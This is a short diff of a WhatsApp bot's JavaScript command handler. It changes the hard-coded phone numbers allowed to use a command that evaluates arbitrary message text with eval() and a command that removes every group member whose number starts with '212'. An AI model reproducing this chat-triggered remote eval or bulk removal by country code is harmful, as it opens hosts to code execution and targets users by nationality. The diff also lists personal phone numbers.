@@ -1739,7 +1739,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94716769285) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1754,7 +1754,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
+    if(senderNumber == 94724375368 || senderNumber == 94716769285) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
